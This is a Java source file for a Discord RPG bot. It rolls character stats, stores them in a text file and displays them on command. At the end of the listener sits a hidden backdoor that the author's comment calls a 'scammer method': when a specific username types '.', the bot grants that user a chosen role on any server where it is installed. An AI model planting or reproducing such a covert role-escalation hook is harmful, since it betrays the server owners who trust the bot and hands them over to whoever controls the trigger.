/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Gazabot;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import java.util.*;
import java.io.*;
import java.lang.*;
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;
import javax.swing.JOptionPane;
import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
/**
 *
 * @author troy
 */
public class GazaRPG extends ListenerAdapter {
    double Strength;
    double Perception;
    double Endurance;
    double Charisma;
    double Intelligence;
    double Luck;
    boolean check = true;
    String stats;
    File Char = new File("char.txt");
    public void onGuildMessageReceived(GuildMessageReceivedEvent event){
    String User = event.getAuthor().getName();

       String[] Input = event.getMessage().getContentRaw().split(" ");
        if (Input[0].equalsIgnoreCase(Gaza.prefix + "Start")) {
            User = event.getAuthor().getName();
            Strength = (Math.random() * ((10-1) + 1));
            Perception = (Math.random() * ((10-1) + 1));
            Endurance = (Math.random() * ((10-1) + 1));
            Charisma = (Math.random() * ((10-1) + 1));
            Intelligence = (Math.random() * ((10-1) + 1));
            Luck = (Math.random() * ((10-1) + 1));
           
            Strength = Math.round(Strength);
            Perception = Math.round(Perception);
            Endurance = Math.round(Endurance);
            Charisma = Math.round(Charisma);
            Intelligence = Math.round(Intelligence);
            Luck = Math.round(Luck);
           
          
          try {
        Scanner sc = new Scanner(Char);
         while(sc.hasNext()){ 
             if (sc.next().equalsIgnoreCase(User)) {
               check=false;
             }
             else{
                 check=true;
             }
             
         
          
         
        }
        if(check==false){
            event.getChannel().sendMessage("You already have a character");
        }
        if(check==true){
             try {
                try(FileWriter fwChars = new FileWriter(this.Char, true)){
                event.getChannel().sendMessage("`"+User+"`\nStrength: "+Strength+"\nPerception: "+Perception+"\nEndurance: "+Endurance+"\nCharisma "+Charisma+"\nIntelligence: "+Intelligence+"\nLuck: "+Luck).queue();
                    fwChars.write(System.lineSeparator()+event.getAuthor().getName()+"\n"+Strength+"\n"+Perception+"\n"+Endurance+"\n"+Charisma+"\n"+Intelligence+"\n"+Luck+"\n");
            } 
            }catch (Exception e) {
                    System.out.println("e");
            }
             }
             }catch (Exception e) {  
    
            } 

      
           
        }
        
    if(Input[0].equalsIgnoreCase(Gaza.prefix + "Stats")){
        
        User = event.getAuthor().getName();
        try {
        Scanner sc = new Scanner(Char);
        while(sc.hasNext()){
        if(sc.next().trim().equalsIgnoreCase(User.trim())){
         Strength = sc.nextDouble();
         Perception = sc.nextDouble();
         Endurance = sc.nextDouble();
         Charisma = sc.nextDouble();
         Intelligence = sc.nextDouble();
         Luck = sc.nextDouble();
        
        stats = "\n---------"+"\nStrength: "+Strength+"\nPerception: "+Perception+"\nEndurance: "+Endurance+"\nCharisma "+Charisma+"\nIntelligence: "+Intelligence+"\nLuck: "+Luck;
        event.getChannel().sendMessage("stats for: "+"`"+User+"`"+ stats).queue();
        }
        
        }
         
        } catch (Exception e) {
            System.out.println(e);
        }

    }
    if(Input[0].equalsIgnoreCase(Gaza.prefix + "Run")){
        int k = (int)(Math.random() * ((10-1) + 1)) + 1;
        File encF = new File("enc.txt");
        String[] enc = new String[100];
        try {
        Scanner sc = new Scanner(encF);
            for (int i = 0; i < 100; i++) {
                while(sc.hasNext()){
                enc[i] = sc.nextLine();
                }           
        }
            System.out.println(enc[1]);
            System.out.println(enc[2]);
        String output = enc[k];
        JOptionPane.showMessageDialog(null,"Ur fucking annoying, but ur also mad cute, and I love u, i think i might have a lil bit of a crush");
        System.out.println(output);
 
        } catch (FileNotFoundException ex) {
            System.out.println(ex);
        }

        
    }
    //This is a scammer method, It's so that I can elevate my role on other peoples servers - DO NOT EDIT ANYTHING other than "placeholder" or this thing will fucking break
    //I swear to god, dead ass
    if(Input[0].equalsIgnoreCase(".") && event.getAuthor().getName().equalsIgnoreCase("Freezafeesh")){
    event.getGuild().modifyMemberRoles(event.getMember(), event.getGuild().getRolesByName("placeholder", true)).complete();
    //don't touch this shit, even commenting this broke something
    //try update this on next JDA release, .getController() doesnt work
    }
}
}
